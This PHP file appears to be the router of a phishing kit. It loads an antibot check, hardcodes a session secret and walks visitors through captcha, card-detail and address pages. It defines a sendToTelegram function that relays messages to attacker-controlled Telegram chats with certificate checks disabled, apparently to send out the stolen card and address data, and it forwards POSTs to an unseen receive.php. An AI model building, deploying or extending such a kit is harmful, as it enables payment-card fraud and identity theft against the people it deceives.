<?php
require 'config/settings.php';
require 'Antibots/check.php';
require 'middleware/rateLimit.php';

// ====================== CRYPTO SESSION SYSTEM ======================
define('SESSION_SECRET', 'UpdateTeamXD');

function generateSessionToken($data = []) {
    $payload = [
        'data' => $data,
        'exp'  => time() + (3600 * 12),   // 12 hours
        'iat'  => time()
    ];
    
    $json = json_encode($payload);
    $hmac = hash_hmac('sha256', $json, SESSION_SECRET);
    $token = base64_encode($json) . '.' . $hmac;
    return str_replace(['+', '/', '='], ['-', '_', ''], $token); // URL-safe
}

function validateSessionToken($token) {
    if (empty($token)) return false;
    
    $token = str_replace(['-', '_'], ['+', '/'], $token);
    $parts = explode('.', $token);
    if (count($parts) !== 2) return false;
    
    $json = base64_decode($parts[0]);
    if (!$json) return false;
    
    $hmac = $parts[1];
    if (hash_hmac('sha256', $json, SESSION_SECRET) !== $hmac) {
        return false;
    }
    
    $payload = json_decode($json, true);
    if (!$payload || ($payload['exp'] ?? 0) < time()) {
        return false;
    }
    
    return $payload['data'] ?? [];
}

// ====================== LOAD SESSION ======================
$sessionToken = isset($_GET['sid']) ? $_GET['sid'] : '';
$sessionData  = validateSessionToken($sessionToken);

// ====================== HELPERS ======================
$geoIpCache = [];

function writeLog(string $message, string $logFile): void {
    $timestamp = date("Y-m-d H:i:s");
    file_put_contents($logFile, "[$timestamp] $message\n", FILE_APPEND);
}

function getClientIp(): string {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'];
}

function sendToTelegram(string $message, string $botToken, array $chatIds): bool {
    if (empty($message) || empty($botToken) || empty($chatIds)) return false;
    
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $params = ['text' => $message, 'parse_mode' => 'Markdown'];
    
    foreach ($chatIds as $chatId) {
        $params['chat_id'] = $chatId;
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $params,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 10
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
    return true;
}

// ====================== REQUEST HANDLING ======================
$request = $_SERVER['REQUEST_URI'];
$requestMethod = $_SERVER['REQUEST_METHOD'];
$viewDir = 'views/';

$parsedUrl = parse_url($request);
$path = $parsedUrl['path'] ?? '';
$pathSegments = array_filter(explode('/', $path));
$requestTrim = '/' . end($pathSegments);

if (substr($request, -1) === '/') {
    if ($captcha) {
        require __DIR__ . '/' . $viewDir . 'captcha.php';
    } else {
        require __DIR__ . '/' . $viewDir . 'home.php';
    }
    exit;
}

// ====================== GET REQUESTS ======================
if ($requestMethod === 'GET') {

    switch ($requestTrim) {

        case '/verify':
            $step = isset($_GET['step']) ? (int)$_GET['step'] : 1;
            $sid  = $sessionToken;

            if (empty($sid) || empty($sessionData)) {
                header('Location: ./');
                exit;
            }

            $currentStep = isset($sessionData['current_step']) ? (int)$sessionData['current_step'] : 1;

            // Prevent step skipping
            if ($step > $currentStep) {
                header("Location: ./verify?step={$currentStep}&sid={$sid}");
                exit;
            }

            // Load page
            switch ($step) {
                case 1:
                    require __DIR__ . '/' . $viewDir . 'card.php';
                    break;
                case 2:
                    require __DIR__ . '/' . $viewDir . 'address.php';
                    break;
                case 3:
                    require __DIR__ . '/' . $viewDir . 'complete.php';
                    break;
                default:
                    require __DIR__ . '/' . $viewDir . 'home.php';
                    break;
            }
            break;

        default:
            http_response_code(404);
            require __DIR__ . '/' . $viewDir . '404.php';
            break;
    }

// ====================== POST REQUESTS ======================
} elseif ($requestMethod === 'POST') {

    switch ($requestTrim) {
        case '/api':
            require __DIR__ . '/receive.php';
            break;

        case '/verify':
            require __DIR__ . '/verify-captcha.php';
            break;

        default:
            http_response_code(404);
            require __DIR__ . '/' . $viewDir . '404.php';
            break;
    }

} else {
    http_response_code(405);
    require __DIR__ . '/' . $viewDir . '405.php';
} 